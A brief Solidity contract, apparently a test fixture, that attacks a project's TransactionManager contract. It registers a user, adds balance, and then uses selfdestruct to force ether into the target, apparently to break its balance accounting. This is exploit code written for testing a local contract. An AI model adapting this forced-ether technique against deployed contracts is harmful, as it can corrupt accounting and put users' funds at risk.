// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract AddBalanceSelfDestructAttacker {
    TransactionManager tmgr;
    constructor(TransactionManager _tmgr) {
        tmgr = _tmgr;
    }

    function attack() public payable {
        tmgr.registerUser();
        tmgr.addBalance(2 ether);
        address payable addr = payable(address(tmgr));
        selfdestruct(addr);

    }
}
